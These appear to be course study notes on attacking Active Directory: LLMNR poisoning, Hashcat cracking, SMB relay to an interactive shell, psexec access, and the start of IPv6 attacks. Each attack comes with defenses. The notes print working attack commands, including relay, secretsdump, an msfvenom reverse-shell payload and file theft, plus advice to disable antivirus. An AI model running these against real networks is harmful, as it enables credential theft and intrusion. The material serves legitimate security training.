---
Status: Done
---
# Introduction

### Initial Attack Vectors in Active Directory Pen Testing

### Overview

- **Objective**: Begin Active Directory penetration testing by exploring initial attack vectors.
- **Lab Setup**: Lab environment is prepared and ready for testing.
- **Goal**: Identify entry points into the network without pre-existing credentials or access.

### Key Concepts

1. **Initial Attack Vectors**:
    - The focus is on ways to initially gain access to Active Directory.
    - Attacks aim to exploit Windows features (not misconfigurations) to gather credentials and gain machine access.
2. **Penetration Testing Context**:
    - Starting from a standard setup (either on-site or via RDP) without credentials.
    - The attacker’s machine is "dropped" into the network with minimal access.
3. **Windows Features Exploitation**:
    - Common tactics include leveraging in-built Windows functionalities.
    - Emphasis on practical attacks that remain relevant despite some improvements in network defenses.

### Reference Article (2018 Edition)

- **"Top 5 Ways to Get Domain Admin Before Lunch"**:
    - Overview of common attacks, still applicable in many environments:
        1. **NetBIOS and LLMNR Poisoning** – Initial attack covered in this course.
        2. **Relay Attacks** – Second primary attack method discussed.
        3. **MS17-010 (EternalBlue)**:
            - Previously covered in the mid-course Capstone.
            - Demonstrates ease of exploitation in unpatched systems.
            - Frequently encountered vulnerability, even years after discovery.
        4. **Kerberoasting** – Addressed later in the course within post-compromise tactics.
        5. **Man-in-the-Middle (MitM) Attacks** – Part of initial attack vectors.

### Practicality and Interview Preparation

- **Core Skillset**: Mastery of these five attacks provides an advantage in penetration testing roles.
- **Course Focus**: Understanding both attacks and defenses to effectively navigate security challenges.

### Next Steps

- **First Attack**: Begin with LLMNR Poisoning

# LLMNR Poisoning Overview

### LLMNR Poisoning in Active Directory Pen Testing

### Overview of LLMNR Poisoning

- **Definition**:
    - **LLMNR (Link-Local Multicast Name Resolution)** acts as a fallback to DNS for host identification on a network.
    - Previously known as **NBT-NS** (NetBIOS Name Service).
- **Vulnerability**:
    - LLMNR allows an attacker to intercept and respond to network requests for name resolution, capturing username and password hashes.
    - Often leveraged when users mistype server names, triggering network-wide broadcasts for identification.

### Attack Workflow

1. **Victim Scenario**:
    - A victim machine sends a DNS request to connect to a server (e.g., a mistyped "hackem" instead of "hackme").
    - When DNS fails, LLMNR broadcasts a message to find the correct server.
2. **Man-in-the-Middle Attack**:
    - The attacker intercepts the request, pretending to be the requested server.
    - The victim unknowingly sends their hash to the attacker, thinking it’s the legitimate server.
3. **Responder Tool**:
    - **Responder** (part of the Impacket toolkit) is used to capture these broadcasted hashes.
    - Ideal usage times: start of the workday or right after lunch, when network traffic is high.
    - Often run before other scans (e.g., Nmap) to ensure maximum interception opportunities.

### Capturing and Cracking Hashes

- **Hash Collection**:
    - When the attack succeeds, **Responder** captures the hash, user, and IP address of the victim.
    - Example output shows usernames (e.g., "Marvel\fcastle") and password hashes.
- **Hash Cracking**:
    - Using **Hashcat**, the captured hashes can be cracked to reveal passwords if they’re weak.
    - Effective password cracking depends on hardware (e.g., Nvidia 2080 Ti for faster cracking).

### Password Complexity Insights

- **Weak vs. Strong Passwords**:
    - Short, common passwords (under 14 characters) are particularly vulnerable.
    - Longer passwords are preferable, ideally phrases without complexity (e.g., no symbols) over shorter complex passwords.
    - Example: a 40-character sentence is more secure than a shorter password with special characters.

### Practical Application

- **Importance of Password Policies**:
    - Passwords should ideally be both long (over 14 characters) and complex.
    - Unique phrases or non-common words improve security, as common patterns are easily cracked.

# Capturing NTLMv2 Hashes with Responder

### Using Responder for LLMNR Poisoning

### Setting up Responder

- **Objective**: Capture network traffic with Responder to intercept and retrieve hashes.
- **Requirements**: Ensure **Impacket toolkit** (including Responder) is installed.
    - Download from GitHub if needed.
        - [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
- **Responder Command**:
    
    ```Shell
    
    responder -I <interface> -dwv
    ```
    
    - `I <interface>`: Specifies the network interface (e.g., `eth0`).
    - `rdtw`: Specifies listening parameters:
        - `d`, `t`, `w` options allow Responder to listen for LLMNR and NetBIOS traffic.
    - Optionally add `v` for verbose mode to view captured hashes in real-time.
    
    ![[/image 52.png|image 52.png]]
    

### Running Responder

1. **Start Responder**:
    - Verify interface (use `ifconfig` or `ip a`) and run Responder on the selected interface.
    - Responder will listen for events and log captured data.
2. **Triggering an LLMNR Request**:
    - On a Windows machine, attempt to access a non-existent network share (e.g., mistyped server address).
        
        ![[/image 1 5.png|image 1 5.png]]
        
    - This triggers an LLMNR broadcast request that Responder can intercept.
3. **Captured Output**:
    - Responder captures:
        
        - **User Hash**: NTLM hash from the victim machine.
        - **User Information**: Username and domain.
        - **Source IP**: IP address of the Windows machine making the request.
        
        ![[/image 2 6.png|image 2 6.png]]
        

### Practical Use and Recap

- **Use Case**: Run Responder early in penetration testing to capture hashes without initiating loud scans.
- **Effectiveness**: Many organizations still use LLMNR, making this a reliable initial attack vector.
- **Potential Next Steps**:
    - Extract captured hashes, then use Hashcat or similar tools for offline cracking.
    - Weak password policies (e.g., simple or short passwords) increase likelihood of successful cracking.

### Next Steps

- **Hash Cracking**: In the following session, Hashcat will be used to crack captured hashes.
- **Defenses**: Future sessions will cover defenses against LLMNR poisoning.

# Password Cracking Captured NTLMv2 Hashes with Hashcat

---

## Hashcat Usage Guide

### Overview

This guide covers the usage of **Hashcat**, a powerful password-cracking tool, on both Linux and Windows systems. The focus is on cracking **NTLMv2 (NetNTLMv2)** hashes using Hashcat's module **5600**.

### 1. Setting Up Hashcat on Kali Linux

- **Hashcat** is pre-installed on Kali Linux.
- We'll use the built-in tools and a wordlist (e.g., `rockyou.txt`) to perform the hash cracking.

### Steps to Prepare:

1. **Copy Captured Hash to a Text File**:
    
    ![[/image 3 4.png|image 3 4.png]]
    
    ```Python
    echo "Hash" > ntlmHash.txt
    # Paste the hash into the file and save
    ```
    
2. **Identify Hashcat Module for NTLMv2**:
    
    ![[/image 4 4.png|image 4 4.png]]
    
    ```Shell
    hashcat --help | grep -i 'ntlm'
    ```
    
    - NTLMv2 corresponds to module **5600**.
3. **Basic Hashcat Command**:
    
    ![[/image 5 4.png|image 5 4.png]]
    
    ```Shell
    hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
    ```
    

### 2. Preparing Wordlists

- **Default Wordlist**: `rockyou.txt` located in `/usr/share/wordlists/`.
- Extract `rockyou.txt` if compressed:
    
    ![[/image 6 4.png|image 6 4.png]]
    
    ```Shell
    gunzip /usr/share/wordlists/rockyou.txt.gz
    # If its not extracted, use the above command
    ```
    
- **Alternative Wordlists**:
    - Search for more on GitHub (e.g., **SecLists**):
        
        ```Shell
        git clone <https://github.com/danielmiessler/SecLists.git>
        ```
        

### 3. Results:

- After running the Hashcat command, the NTLM hash will be bruteforce using the dictionary list and the password, if included in the wordlists, will be cracked, as per below.

![[/image 7 4.png|image 7 4.png]]

  

### 5. Password Cracking Strategies

- Use weak or common passwords to quickly identify vulnerabilities.
- Examples of common password patterns to try:
    - Company names with appended numbers (e.g., `Company123!`).
    - Seasonal passwords (e.g., `Winter2024`).
    - Popular weak passwords (`password1`, `admin123`, etc.).

### 6. Mitigation Strategies

- Strong password policies.
- Implementing multifactor authentication.
- Regularly updating and auditing password lists.

---

### Common Hashcat Commands

|   |   |
|---|---|
|Command|Description|
|`hashcat --help`|Display help and options|
|`hashcat -m 5600 hash.txt wordlist.txt`|Crack NTLMv2 hash using specified wordlist|
|`hashcat -m 0 hash.txt wordlist.txt`|Crack MD5 hash using specified wordlist|
|`hashcat -a 0`|Use dictionary attack (default mode)|
|`hashcat -O`|Optimize performance (recommended for GPUs)|

### Additional Resources

- **SecLists GitHub**: Contains comprehensive lists of usernames, passwords, URLs, etc.
    
    ```Shell
    git clone <https://github.com/danielmiessler/SecLists.git>
    ```
    
- **Hashcat Documentation**: [Hashcat Wiki](https://hashcat.net/wiki/)

---

# LLMNR Poisoning Defenses

---

## LMNR & NBT-NS Mitigation Guide

### Overview

LMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are fallback name resolution protocols used in Windows environments. They can be exploited for **hash capture attacks**, leading to unauthorized network access. Disabling these protocols and implementing additional security measures are essential for preventing these attacks.

### 1. **Disable LMNR and NBT-NS**

The best defense against LMNR and NBT-NS attacks is to disable these protocols entirely.

### Steps to Disable LMNR:

- Open **Group Policy Editor** (`gpedit.msc`).
- Navigate to:
    
    ```Plain
    Computer Configuration > Administrative Templates > Network > DNS Client
    ```
    
- Set **"Turn off multicast name resolution"** to **Enabled**.

### Steps to Disable NBT-NS:

- Open **Network and Sharing Center**.
- Click on **Change adapter settings**.
- Right-click on your network adapter > **Properties**.
- Select **Internet Protocol Version 4 (TCP/IPv4)** > **Properties** > **Advanced** > **WINS** tab.
- Set **NetBIOS setting** to **Disable NetBIOS over TCP/IP**.

**Note:** Disabling LMNR alone is not sufficient. Ensure both LMNR and NBT-NS are disabled to avoid fallback vulnerabilities.

### 2. **Enable Network Access Control (NAC)**

If disabling LMNR/NBT-NS is not feasible, consider implementing **Network Access Control (NAC)**.

- **What is NAC?**
    
    NAC restricts network access by verifying the MAC address of devices connecting to the network.
    
    - If the MAC address is not recognized, access is denied or limited.
    - This prevents unauthorized devices from simply plugging into a network port.
- **Benefits**:
    - Adds a layer of security to internal networks.
    - Limits lateral movement for attackers within the network.
    - Reduces the attack surface by controlling device access.

### 3. **Enforce Strong Password Policies**

Encourage the use of **strong, complex passwords** to make hash cracking more difficult.

### Password Policy Recommendations:

- Minimum password length: **14 characters or more**.
- Use **passphrases** or longer sentences (e.g., "MySecurePassw0rd!2024").
- Avoid common patterns (e.g., "Password123", "Fall2024!").
- Consider using **multi-factor authentication (MFA)** for additional security.

### Password Cracking Time Estimates:

- **7-8 characters**: Can be cracked in seconds to hours.
- **14-15 characters**: Takes years to crack using brute force.
- Increasing password length by just a few characters significantly increases the difficulty for attackers.

### 4. **Additional Tips for Interviews & Real-World Scenarios**

- When discussing security in interviews, emphasize the importance of **disabling LMNR/NBT-NS**.
- Highlight other mitigations like NAC and strong password policies.
- Mention the potential of LMNR/NBT-NS poisoning for **hash capturing** and how attackers can use captured hashes to gain further access.

---

  

---

# SMB Relay Attacks Overview

---

## SMB Relay Attack Guide

[https://raxis.com/blog/ad-series-how-to-perform-broadcast-attacks/](https://raxis.com/blog/ad-series-how-to-perform-broadcast-attacks/)

### Overview

An **SMB Relay attack** allows an attacker to capture SMB authentication requests and relay them to another machine, effectively gaining access without needing to crack hashes offline. This technique leverages the absence of **SMB signing**, which is crucial for preventing such attacks.

### 1. **What is SMB Relay?**

> [!important] Instead of **capturing hashes** and cracking them offline, an attacker can **relay the captured credentials** to another machine.

- **Key Requirements**:
    1. **SMB Signing** must be **disabled** on the target machine.
    2. The relayed credentials must belong to a user with **admin privileges** on the target machine.
    3. The relay must be directed to a **different machine** (not the same one from which the hash was captured).

### 2. **Understanding SMB Signing**

- **SMB Signing** is a security feature that verifies the authenticity of SMB packets.
    - If **enabled**, it prevents relayed credentials from being accepted, as the packets need to be signed by the legitimate user.
    - If **disabled**, SMB does not verify the source of the packet, allowing relayed credentials to be accepted.

### 3. **Attack Scenario**

- Assume **User A** (e.g., "Frank Castle") is an admin on two different machines.
- Capture **Frank's hash** using a tool like **Responder**.
- Relay this captured hash to another machine where **Frank** also has admin access.
- If successful, gain access to that machine and perform further attacks (e.g., dumping SAM hashes).

### 4. **Setting Up the Attack**

### Step 1: Configure **Responder**

- Edit the Responder configuration file to disable SMB and HTTP responses:
    
    ```Shell
    nano /etc/responder/Responder.conf
    ```
    
    - Set the following options:
        
        ```Plain
        SMB = Off
        HTTP = Off
        ```
        
    - This ensures Responder only captures hashes without responding to SMB/HTTP requests.

### Step 2: Start **Responder**

- Launch Responder to start listening for authentication attempts:
    
    ```Shell
    sudo responder -I eth0
    ```
    

### Step 3: Set Up **ntlmrelayx**

- Use **[ntlmrelayx.py](http://ntlmrelayx.py/)** from the Impacket suite to relay captured hashes:
    
    ```Shell
    sudo impacket-ntlmrelayx -tf targets.txt --smb2support
    ```
    
    - `tf targets.txt`: A file containing the IP addresses of target machines.
    - `-smb2support`: Enables support for SMBv2.

### 5. **Attack Execution**

1. **Wait for a victim** to attempt SMB authentication on the network.
2. **Responder captures the hash** but does not respond.
3. **ntlmrelayx relays** the captured credentials to a specified target.
4. If **SMB signing is disabled** on the target and the user has admin rights, the attack is successful.
5. **Access Gained**:
    - Dump **SAM hashes**:
        
        ```Shell
        secretsdump.py target_ip -hashes lmhash:nthash
        ```
        
    - Or gain a **reverse shell** for further exploitation.

### 6. **What Can Be Extracted?**

- **SAM (Security Account Manager) Hashes**:
    - Equivalent to Linux **shadow files**, these contain local usernames and password hashes.
    - Can be used to crack passwords offline or pass-the-hash to other machines.

### 7. **Defense Against SMB Relay Attacks**

- **Enable SMB Signing**:
    - Enforcing SMB signing ensures all SMB packets are signed and verified, preventing unauthorized relay.
    - Configure via Group Policy:
        
        ```Plain
        Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options > Microsoft network server: Digitally sign communications (always)
        ```
        
- **Network Segmentation**: Limit where SMB traffic can travel.
- **Network Access Control (NAC)**: Prevent unauthorized devices from connecting to the network.
- **Strong Password Policies**: Use complex passwords to reduce the risk of hash capture attacks.

# Quick Lab Update

---

## SMB Relay Attack: Windows Lab Setup Adjustment

### Overview

Before launching an SMB Relay attack, a critical step needs to be configured on your **Windows 10 lab machines** to ensure they are discoverable on the network. This involves enabling **Network Discovery** and **File Sharing**.

### 1. **Enabling Network Discovery on Windows 10**

To allow the machines to detect each other and ensure the attack can proceed, follow these steps on **both Windows 10 machines**:

### Steps to Enable Network Discovery:

1. **Open File Explorer**:
    - Press `Win + E` or click the folder icon on the taskbar.
2. **Navigate to Network Settings**:
    - On the left pane, click on **Network**.
3. **Turn On Network Discovery**:
    - A prompt may appear at the top of the File Explorer window.
    - Click on **"Click to change..."** and select **"Turn on network discovery and file sharing"**.
4. **Confirm the Change**:
    - A pop-up will ask if you want to enable network discovery.
    - Select **Yes** or **OK** to confirm.
5. **Verify Visibility**:
    
    - After enabling, you should start seeing other machines on your network in the **Network** section of File Explorer.
    
    ![[/image 8 4.png|image 8 4.png]]
    

### 2. **Repeat on All Target Machines**

- Repeat the above steps on all Windows 10 machines involved in the lab to ensure they are visible to each other.

### 3. **Next Step in SMB Relay Attack**

- After setting up network visibility, you can proceed with discovering machines on the network that have **SMB signing disabled**.
- The next video will cover using tools to find vulnerable machines with SMB signing turned off.

---

# Discovering Hosts with SMB Signing Disabled

---

## Detecting SMB Signing and Preparing for SMB Relay Attack

### Overview

Before performing an SMB Relay attack, it's crucial to identify which machines have **SMB signing enabled** or **disabled**. This will determine your potential targets, as the attack is only feasible against systems where SMB signing is not required.

### 1. **What is SMB Signing?**

- **SMB Signing** is a security feature that ensures the integrity and authenticity of SMB communications.
    - **Enabled and Required**: Attack not possible.
    - **Enabled but Not Required**: Vulnerable to relay attacks.
    - **Disabled**: Vulnerable to relay attacks.

### 2. **Methods to Detect SMB Signing Status**

There are several methods to check if SMB signing is enabled on a target machine:

1. **Nessus Scan**: Provides detailed reports on SMB signing status.
2. **Custom Scripts**: Search GitHub for SMB signing check scripts.
3. **Nmap**: Utilize Nmap's built-in scripts to detect SMB signing.

### 3. **Using Nmap to Check SMB Signing**

### Nmap Command:

```Shell
sudo nmap --script smb2-security-mode.nse -p 445 192.168.1.0/24
```

- **Explanation**:
    - `-script smb2-security-mode.nse`: Nmap script to check SMB signing.
    - `p 445`: Scans SMB port (default 445).
    - `192.168.1.0/24`: Adjust this to match your network range.

### Sample Output Analysis:

![[/image 9 4.png|image 9 4.png]]

- **Domain Controller (Server)**:
    
    ```Plain
    192.168.213.147
    | smb2-security-mode:
    |   Message signing enabled and required
    ```
    
    - **Cannot** relay to this machine as signing is required.
- **Workstations (e.g., Punisher, Spider-Man)**:
    
    ```Plain
    192.168.213.130
    | smb2-security-mode:
    |   Message signing enabled but not required
    ```
    
    - Vulnerable to relay attacks due to **non-required** signing.

### 4. **Preparing Target List for the Attack**

Once vulnerable machines are identified, prepare a list of IP addresses to target.

### Create a Target List:

1. **Open a text editor** (e.g., `gedit` or `nano`):
    
    ```Shell
    gedit targets.txt
    ```
    
2. **Add Vulnerable IPs**:
    
    ```Plain
    192.168.213.132  # Punisher
    192.168.213.130  # Ironman
    ```
    
3. For simplicity, include only one machine for this lab:
    
    ```Plain
    192.168.213.130  # Tony Stark's Machine
    ```
    
    ![[/image 10 4.png|image 10 4.png]]
    
4. **Save and Close** the file.

### 5. **Next Steps**

- In the upcoming video, you'll configure **Responder** and **ntlmrelayx** for the actual relay attack using the target list you just created.

---

### Nmap Cheat Sheet for SMB Discovery

|   |   |
|---|---|
|Command|Description|
|`nmap -p 445 --script smb2-security-mode.nse <target>`|Check SMB signing status|
|`nmap -p 445 --script smb-os-discovery.nse <target>`|Detect OS version via SMB|
|`nmap -p 445 --script smb-enum-shares.nse <target>`|List shared folders over SMB|

---

# SMB Relay Attack Demonstration Part 1

---

### 1. **Setup Recap**

- **Target Machines**:
    - **Machine 1 (Punisher)**: IP `192.168.213.132`
    - **Machine 2 (IronMan**: IP `192.168.213.130`
- **Goal**: Relay captured credentials from Machine 1 to Machine 2.

### 2. **Configuring Responder**

Before starting the attack, you need to configure **Responder** to capture hashes but **not respond** to SMB/HTTP requests (preventing direct interaction).

### Steps to Configure Responder:

1. **Edit Responder Configuration**:
    
    ```Shell
    sudo nano /etc/responder/Responder.conf
    ```
    
    ![[/image 11 4.png|image 11 4.png]]
    
    - Set the following:
        
        ```Plain
        SMB = Off
        HTTP = Off
        ```
        
        ![[/image 12 4.png|image 12 4.png]]
        
    - Save and exit.
2. **Start Responder**:
    
    ```Shell
    sudo responder -I eth0 -dwv
    ```
    
3. **Verify Setup**:
    
    - Scroll up in the Responder output to confirm **SMB** and **HTTP** are turned off (highlighted in red).
    
    ![[/image 13 4.png|image 13 4.png]]
    

### 3. **Setting Up NTLM Relay**

Now, use **ntlmrelayx** to relay the captured credentials from one machine to another.

### Steps to Run ntlmrelayx:

1. **Create a Target List**:
    
    ```Shell
    echo "192.168.213.130" > targets.txt
    ```
    
    - The file `targets.txt` contains the IP of the target machine
2. **Start ntlmrelayx**:
    
    ```Shell
    sudo ntlmrelayx.py -tf targets.txt -smb2support
    ```
    
    - `tf targets.txt`: Specifies the file with target IPs.
    - `-smb2support`: Ensures support for SMBv2 connections.
    
    ![[/image 14 4.png|image 14 4.png]]
    
3. **Wait for Connection**:
    - ntlmrelayx will now wait for any incoming connection attempts from Machine 1 (Punisher).

### 4. **Triggering the Attack**

To simulate a connection from **Punisher (Machine 1)** to the attacker machine:

1. Open a terminal on Machine 1.
2. Point it towards the attacker's IP to trigger the hash capture:
    
    ```Shell
    net use \\\\192.168.57.139\\share
    ```
    
    - Replace `192.168.57.139` with the attacker's IP address.
    
    ![[/image 15 4.png|image 15 4.png]]
    
3. **Monitor ntlmrelayx Output**:
    
    - Upon a successful relay, you will see:
    - If the relayed credentials have admin rights on the target, the attack will succeed.
    
    ![[/image 16 4.png|image 16 4.png]]
    

### 7. **Key Takeaways**

- **SMB Signing**: If signing is enabled but not required, it’s treated as **disabled**, making it vulnerable.
- **Common Security Oversight**: Many default Windows environments have SMB signing disabled, especially on workstations, making them susceptible to relay attacks.
- **Admin Rights**: The attack is only successful if the relayed user has administrative privileges on the target machine.

  

---

# SMB Relay Attack Demonstration Part 2

---

## Gaining an Interactive SMB Shell with ntlmrelayx

### Overview

In this part of the attack, we extend the SMB relay attack to gain an **interactive SMB shell**. This enables deeper access to the target system, allowing for various file system manipulations, privilege escalations, and even command execution.

### 1. **Setting Up Responder**

First, we need to configure **Responder** to capture hashes without responding to SMB and HTTP requests.

### Responder Configuration Recap:

1. **Edit Responder Configuration**:
    
    ```Shell
    sudo nano /etc/responder/Responder.conf
    ```
    
    - Ensure the following settings are turned **off**:
        
        ```Plain
        SMB = Off
        HTTP = Off
        ```
        
2. **Start Responder**:
    
    ```Shell
    sudo responder -I eth0 -dwv
    ```
    
    - `I eth0`: Specifies the network interface.
    - `wrb`: Flags to set Responder for capturing without responding.

### 2. **Launching ntlmrelayx for Interactive Shell**

We now set up **ntlmrelayx** to gain an interactive shell.

### Steps to Run ntlmrelayx:

1. **Run ntlmrelayx with Interactive Mode**:
    
    ```Shell
    sudo ntlmrelayx.py -tf targets.txt --smb2support -i
    ```
    
    - `tf targets.txt`: Target file containing the IPs to relay to.
    - `-smb2support`: Enables support for SMBv2.
    - `i`: Launches an interactive SMB client shell upon successful authentication.
    
    ![[/image 17 4.png|image 17 4.png]]
    
2. **Wait for Authentication**:
    - The tool will wait for incoming connections and attempt to relay them to the specified targets.

### 3. **Triggering the Attack**

1. Use a **victim machine** to trigger the event:
    
    ```Shell
    net use \\\\192.168.57.139\\share
    ```
    
    - Replace `192.168.57.139` with your attacker's IP address.
    
    ![[/image 18 3.png|image 18 3.png]]
    
2. **Monitor ntlmrelayx Output**:
    - If successful, you’ll see:
        
        ![[/image 19 3.png|image 19 3.png]]
        

### 4. **Accessing the Interactive SMB Shell**

- Once you received with interactive SMB client shell, you will need to use netcat to initiate a connection with the shell.

1. **Open a New Terminal Tab**.
2. **Connect Using netcat**:
    
    ```Shell
    nc 127.0.0.1 11000
    ```
    
    - This opens an SMB client shell connected to the target machine.
        
        ![[/image 20 3.png|image 20 3.png]]
        
3. **Available Commands in the SMB Shell**:
    - **View Available Shares**:
        
        ![[/image 21 3.png|image 21 3.png]]
        
        ```Shell
        shares
        ```
        
    - **Access Specific Share**:
        
        ```Shell
        use C$
        ```
        
    - **List Directory Contents**:
        
        ```Shell
        ls
        ```
        
    - **Navigate to Admin Directory**:
        
        ```Shell
        use ADMIN$
        ls
        ```
        
    - You now have full access to the target's filesystem, including critical directories like `C:\\Windows\\System32`.
        
        ![[/image 22 3.png|image 22 3.png]]
        

### 5. Optional **Post-Exploitation Options**

Once inside the interactive SMB shell, several post-exploitation techniques can be applied:

- **Dump SAM Hashes** (local user credentials):
    
    ```Shell
    secretsdump.py -hashes lmhash:nthash target_ip
    ```
    
- **Upload/Download Files**:
    - **Put File**: Upload a file from your machine to the target.
        
        ```Shell
        put myfile.txt
        ```
        
    - **Get File**: Download a file from the target to your machine.
        
        ```Shell
        get sensitive_data.txt
        ```
        
- **Change User Password**:
    
    ```Shell
    changepw <username>
    ```
    

### 6. **Advanced Shell Techniques**

- **Execute Remote Commands**:
    - Use the `c` option to execute specific commands:
        
        ```Shell
        ntlmrelayx.py -tf targets.txt --smb2support -c "whoami"
        ```
        
- **Obtain Reverse Shell**:
    - Generate a payload using **msfvenom**:
        
        ```Shell
        msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > payload.exe
        ```
        
    - Upload the payload via the SMB shell and execute it to get a reverse shell.

### 7. **Key Takeaways**

- The **interactive SMB shell** is a powerful tool that allows deep interaction with the target system.
- This attack leverages the absence of **mandatory SMB signing**, a common oversight in default Windows configurations.
- The captured **SAM hashes** can be used for offline cracking or further lateral movement.

---

# SMB Relay Attack Defenses

---

## Mitigation Strategies for SMB Relay Attacks

### Overview

**SMB Relay attacks** exploit weak authentication configurations in Windows networks, especially when **SMB signing** is not enforced. Mitigating these attacks requires a combination of system hardening, authentication restrictions, and proper account management.

### 1. **Enable SMB Signing**

- **Description**: Enforcing SMB signing ensures the integrity and authenticity of SMB communications, effectively preventing relay attacks.
- **How to Enable**:
    - **Group Policy**:
        
        ```Plain
        Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
        ```
        
        - Set **Microsoft network client: Digitally sign communications (always)** to **Enabled**.
        - Set **Microsoft network server: Digitally sign communications (always)** to **Enabled**.
- **Pros**:
    - Completely stops SMB relay attacks.
- **Cons**:
    - **Performance Impact**: Can reduce file transfer speeds by approximately 15%.
    - The trade-off for enhanced security may affect network performance, especially in environments with high file transfer volumes.

### 2. **Disable NTLM Authentication**

- **Description**: NTLM (NT LAN Manager) is an older authentication protocol vulnerable to relay attacks. Disabling NTLM forces the use of more secure protocols like Kerberos.
- **How to Disable**:
    - **Group Policy**:
        
        ```Plain
        Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options > Network security: Restrict NTLM
        ```
        
        - Set **Network security: Restrict NTLM** to **Deny all**.
- **Pros**:
    - Prevents NTLM-based relay attacks entirely.
- **Cons**:
    - If **Kerberos** fails, Windows may fall back to NTLM, reintroducing the vulnerability.
    - May impact older applications that rely on NTLM for authentication.

### 3. **Account Tiering and Privilege Management**

- **Description**: Implementing **account tiering** ensures that administrative accounts are only used on specific high-trust systems (e.g., domain controllers) and not on regular workstations.
- **Best Practices**:
    - Domain administrators should **only** log into domain controllers, not workstations.
    - Use **least privilege** principles to restrict admin access on user machines.
- **Pros**:
    - Minimizes the risk of compromising high-value accounts.
- **Cons**:
    - Requires strict policy enforcement and user training.

### 4. **Restrict Local Administrator Rights**

- **Description**: Limiting local admin rights on workstations prevents attackers from gaining full control if they capture admin credentials.
- **Implementation**:
    - Remove unnecessary users from the **local administrators** group.
    - Use tools like **LAPS (Local Administrator Password Solution)** to manage local admin credentials securely.
- **Pros**:
    - Reduces lateral movement opportunities for attackers.
- **Cons**:
    - Users may submit more service desk tickets due to lack of admin rights, increasing IT support workload.
    - Potential pushback from users who want admin privileges.

### 5. **Additional Best Practices**

- **Use Endpoint Detection and Response (EDR)** solutions to monitor for suspicious SMB activity.
- **Network Segmentation**:
    - Isolate critical systems to limit exposure to SMB relay attacks.
- **Patching and Updates**:
    - Regularly update systems to ensure they have the latest security patches.
- **Disable Unused Services**:
    - Disable SMBv1, as it is obsolete and vulnerable to attacks like **EternalBlue**.

### **Summary of Mitigation Strategies**

|   |   |   |   |
|---|---|---|---|
|Mitigation Strategy|Effectiveness|Pros|Cons|
|Enable SMB Signing|High|Completely stops SMB relay|15% performance decrease on file transfers|
|Disable NTLM Authentication|High|Prevents NTLM relay attacks|May impact legacy systems|
|Account Tiering|Medium-High|Protects high-value accounts|Requires strict policy enforcement|
|Restrict Local Admin Rights|Medium|Limits attack surface on workstations|Potential increase in service desk tickets|
|Use EDR & Network Segmentation|Medium|Detects and contains attacks|Additional cost for implementation|

### 6. **Next Steps**

- We will now move on to techniques for **gaining shell access** using information gathered from previous attacks.
- Following that, we'll explore **IPv6 attacks** and **network enumeration** strategies.

---

# Gaining Shell Access with Metasploit Psexec/psexec.py

---

## Notes on Gaining Shell Access

### **Overview**

- Goal: Gain shell access using available credentials.

### **Setup**

1. **Tools**: Using **Metasploit (MSF Console)**.
2. **Scenario**: We have SMB (Server Message Block) open with a username and password.
3. **Objective**: Use credentials to gain shell access if the user is a local administrator.

### **Steps to Exploit SMB with Metasploit**

1. **Start MSF Console**:
    
    ```Shell
    msfconsole
    ```
    
    ![[/image 23 3.png|image 23 3.png]]
    
2. **Search and Use Exploit**:
    - Search for `psexec` or `smb` related exploits:
        
        ```Shell
        search psexec
        ```
        
        ![[/image 24 3.png|image 24 3.png]]
        
    - Select exploit:
        
        ```Shell
        use exploit/windows/smb/psexec
        ```
        
        ![[/image 25 3.png|image 25 3.png]]
        
3. **Set Options**:
    
    ```Shell
    set RHOSTS 192.168.213.130
    set SMBUser fcastle
    set SMBPass Password@01
    set SMBDomain marvel.local
    ```
    
    ![[/image 26 3.png|image 26 3.png]]
    
4. **Set Payload**:
    
    ```Shell
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST eth0
    ```
    
    ![[/image 27 3.png|image 27 3.png]]
    
5. **Run Exploit**:
    
    ```Shell
    exploit
    ```
    

### **Troubleshooting Authentication Issues**

- If the initial attempt fails, try different payloads or targets.
    - Example: Setting a different target type.
        
        ```Shell
        show targets
        set target 2
        ```
        
- If `psexec` fails, it could be due to **Windows Defender** blocking the payload.
    - Solution: Disable Windows Defender temporarily.

### **Alternative Tools**

- `**psexec.py**` from **Impacket** as a backup method:
    
    ```Shell
    python3 psexec.py marvel.local/fcastle:password1@192.168.57.141
    ```
    
- If `psexec` gets blocked, try:
    
    - **SMBExec**
    - **WMIExec**
    
    ```Shell
    smbexec.py marvel.local/EF.Castle:password1@192.168.57.141
    wmiexec.py marvel.local/EF.Castle:password1@192.168.57.141
    ```
    

### **Key Points**

- **Antivirus Detection**: Tools like `psexec` are often detected by antivirus (e.g., Windows Defender).
- **Alternative Shells**: If full Meterpreter shell fails, fall back to less interactive but still useful shells like SMBExec or WMIExec.
- **Persistence**: Don’t give up if one tool doesn’t work; try others.

### **Recommendations**

- **Start Quietly**: Use less detectable tools like `smbexec` or `wmiexec` first.
- **Disable Antivirus**: If possible, disable antivirus once on the machine to execute more powerful tools.
- **Exploration**: Once in, navigate the system, identify antivirus, and look for ways to disable it for further exploitation.

  

---

# IPv6 Attacks Overview

### Notes on IPv6 Attacks and DNS Takeover Exploits

### Overview

- Focus: **IPv6 attacks**, specifically **DNS takeover attacks**.
- These attacks leverage unused IPv6 DNS capabilities on networks primarily using IPv4.

---

### Attack Context

1. **Traditional Methods**:
    - Previously common attack methods:
        - Hash collection and cracking (e.g., Responder).
        - SMB relaying if hashes couldn't be cracked.
2. **IPv6 as a Vector**:
    - Modern networks often have IPv6 enabled by default, even if unused.
    - DNS for IPv6 (AAAA records) is typically unconfigured, leaving a gap for attackers.

---

### Attack Process

1. **Setup**:
    - Attacker deploys a machine to spoof the network's IPv6 DNS server.
    - Devices on the network automatically send their IPv6 traffic to the attacker.
2. **Exploitation**:
    - Attacker intercepts traffic, including **authentication requests**, which can be relayed to a Domain Controller (DC) via protocols like **SMB**.
    - Triggers for exploitation include:
        - Rebooting a victim machine.
        - Intercepting user credentials.
3. **Relaying Credentials**:
    - Relayed credentials are used for actions such as:
        - Logging into a DC.
        - Creating new machine accounts.
    - Exploits utilize **NTLM relay** and tools like:
        - **MITM6** (Man-in-the-Middle 6).
        - **NTLMRelayX**.

---

### Tools

1. **MITM6**:
